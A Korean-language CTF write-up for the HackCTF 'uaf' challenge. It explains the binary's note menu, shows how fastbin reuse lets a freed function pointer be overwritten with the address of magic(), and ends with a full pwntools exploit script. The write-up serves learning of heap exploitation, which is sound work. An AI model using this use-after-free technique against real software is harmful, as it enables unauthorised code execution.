---
layout: post
title:  "HacCTF uaf write-up"
date:   2020-02-03 19:45:55
image:  hackctf_uaf.PNG
tags:   [HackCTF]
categories: [Write-up]
---
# [HackCTF] uaf

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled.png)

NX 비트 와 카나리가 걸려있다.

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%201.png)

종현이와 함께 엉덩이 공부를 해보자고한다. 종현이가 누군지는 모르지만 힙과 관련한 문제로 추정된다. 아마 1번 메뉴로 malloc이 이루어지고 2번 메뉴로 free가 진행되는것으로 보인다. 마지막으로 3번을 통해 입력한 데이터를 확인 가능하다. 코드를 살펴보자.

**3) 코드 확인**

    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // eax
      char buf; // [esp+8h] [ebp-10h]
      unsigned int v5; // [esp+Ch] [ebp-Ch]
    
      v5 = __readgsdword(0x14u);
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 2, 0);
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          read(0, &buf, 4u);
          v3 = atoi(&buf);
          if ( v3 != 2 )
            break;
          del_note();
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            print_note();
          }
          else
          {
            if ( v3 == 4 )
              exit(0);
    LABEL_13:
            puts(&byte_8048D08);
          }
        }
        else
        {
          if ( v3 != 1 )
            goto LABEL_13;
          add_note();
        }
      }
    }

v3 변수에 저장된 값을 참조하여 각 메뉴에 맞는 함수가 실행된다. add_note 함수부터 살펴보자.

- add_note()

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%202.png)

add_note() 함수 로직을 살펴보면, 우선 notelist 라는 배열이 비여있느지 검사하게 된다. notelist는 전역에 선언된 배열로서 추가할수 있는 note의 수는 최대 5개이다.

add_note에서 malloc은 총 2개 호출된다

- print_note_content라는 함수 포인터를 저장하기 위해 선언
- 실제 데이터를 저장하이 위해 선언

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%203.png)

현재 1번 메뉴를 선택하여 add_note의 실행된 직후 상황이다. 0x804c008 의 위치에 함수포인터가 들어가 있고, 0x804c018에 실 데이터가 저장되있는 것을 확인할 수 있다. 이렇게 하나의 add_note가 실행될때 마다 두개의 청크가 할당된다.

이번에는 del_note 함수를 살펴보자

- del_note()

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%204.png)

 add_note를 진행하게 된다면 notelist 배열의 인덱스 0 부터 차례대로 값이 채워지게 된다. 따라서 del_note를 호출하면 어떤 인덱스의 note를 지울것인지 먼저 묻는다.

그 후에 free가 진행된다. 아까 add_note에서 malloc이 총 2개 호출됐으므로, free 역시 2개 호출된다. 자세히 보면 실제 데이터가 저장된 청크를 먼저 해제하고, 그다음 함수 포인터가 저장되어있는 청크를 해제하게 된다. 해제된 청크들은 사이즈에 따라서 bins 들에 추가될 것이다.

마지막으로 print_note 함수를 살펴보자

- print_note()

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%205.png)

17라인에서 아까 첫번째 malloc에 저장한 함수포인터를 호출한다. 해당 부분에서 저장한 실 데이터가 출력이 되는 부분이다.

### 2. 접근방법

---

제공해준 함수들 중에 magic() 함수를 호출하는것이 이번 문제의 목표이다.

(힙 이론은 정리를 이미 다 해놨기 때문에 따로 설명은 하지 않겠다.)

문제를 보면 2번 메뉴로 free를 하는데 3번인덱스로 free시킨 인덱스의 청크데이터를 찍어보면 그대로 출력이된다. 따라서 이 부분을 이용해야한다.

우리가 공략해야하는 부분은 바로 함수포인터가 저장되는 부분이다. 해당 주소를 magic함수의 주솔 변경한다면 print_note 함수를 이용하여 플래그를 얻을수 있다.

또한 동일한 사이즈를 **"할당 → 해제 → 다시 할당"** 하게 된다면, 힙 내부적으로 전에 free 시킨 동일사이즈 청크를 재할당 해준다. 

처음에 fastbin 사이즈로 1번 메뉴를 선택해보자. 

(여기서 size 8은 청크 사이즈가 아닌 요청한 사이즈이다. 헷갈리지 말것)

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%206.png)

그러면 현재 이렇게 총 4개의 청크가 할당되어있을 것이다

del_note를 호출하면 먼저 데이터가 저장되어 있는 부분이 free되고 그다음 함수 포인터가 저장된 청크가 free 된다. 그 후 freed 청크는 fastbin에 들어가는데, fastbin은 LIFO 구조이므로 나중에 들어온 청크가 먼저 재할당된다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%207.png)

현재 두개 다 free된 상태이다. index 0을 먼저 free 시켰고, 그다음 index 1을 free 시켰다. LIFO 구조라 했으므로 현재 가장 마지막에 free된 index 1 (0x804c020) 가 제일 먼저 재할당의 우선순위를 가진다.

32비트에서는 8바이트 단위로 청크가 할당되므로 0x10 크기 이상의 사이즈를 요청하면 저 free된 공간을 사용할 수 없다. 왜냐하면 0x10을 요청하면 헤더가 포함되어 청크의 크기는 0x18가 되기 때문이다.

따라서 밑에 추가적인 청크를 top 청크에서 때내어 할당해줄것이다. 하지만 그건 실제 데이터가 저장되는 청크에 해당될뿐, 함수포인터가 저장되는 청크는 8로 고정되어 있으므로 저 초록색 부분을 이용할 것이다. 확인해보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%208.png)

fastbin에 0x804c020가 재할당되어 빠진것을 볼수 있다. 16사이즈의 add_note에 해당하는 청크는 노란색 청크이다. 또한 여기서 add_note를 한번더 호출하여 8사이즈를 요청한다고 해보자. 그럼 8사이즈 청크가 현재 free되어 fastbin에 들어있는 것이 3개나 있으므로 맨 왼쪽부터 재할당을 해줄 것이다

그렇게 된다면 0x804c030을 재할당하여 함수포인터를 저장할 것이고 0x804c000을 재할당하여 실 데이터를 저장할 것이다. 

그런데 여기서 만약 print_note를 호출하여 인덱스0을 선택하게 된다면, 해당 인덱스의 함수포인터부분을 가져와서 호출을 하게 될텐데, 함수포인터가 들어가있어야 할 공간과 인덱스 3의 데이터 공간이 일치하게 되어 비정상적인 상황이 발생할 것이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%209.png)

이렇게 말이다. 여기서 만약 print_note의 인덱스0을 호출해보면 0x61616161 주소를 call 하게 되어 에러가 날 것이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20uaf/Untitled%2010.png)

역시 에러가 났다. 결론적으로 이 부분을 활용하여 0x61616161로 임시로 넣어본 값이 아닌, magic 함수의 주소를 넣으면 될것이다.

### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    p=remote("ctf.j0n9hyun.xyz",3020)
    #p=process("./uaf")
    #gdb.attach(p)
    p.sendlineafter(" :","1")
    p.sendlineafter(" :","8")
    p.sendlineafter(" :","AAAA")
    p.sendlineafter(" :","1")
    p.sendlineafter(" :","8")
    p.sendlineafter(" :","AAAA")
    
    
    p.sendlineafter(" :","2")
    p.sendlineafter(" :","0")
    p.sendlineafter(" :","2")
    p.sendlineafter(" :","1")
    
    
    p.sendlineafter(" :","1")
    p.sendlineafter(" :","16")
    p.sendlineafter(" :","AAAA")
    p.sendlineafter(" :","1")
    p.sendlineafter(" :","8")
    p.sendlineafter(" :","\x86\x89\x04\x08")
    
    p.sendlineafter(" :","3")
    p.sendlineafter(" :","0")
    
    p.interactive()

### 4. 몰랐던 개념

---

확실히 힙을 먼저 공부하고 문제를 풀어보니, 어디를 접근해야 하는지 눈에 보이는것 같다.

추가적으로 이제 익스 코드를 쫌 이쁘고 효율적으로 짜보는 것을 연습하자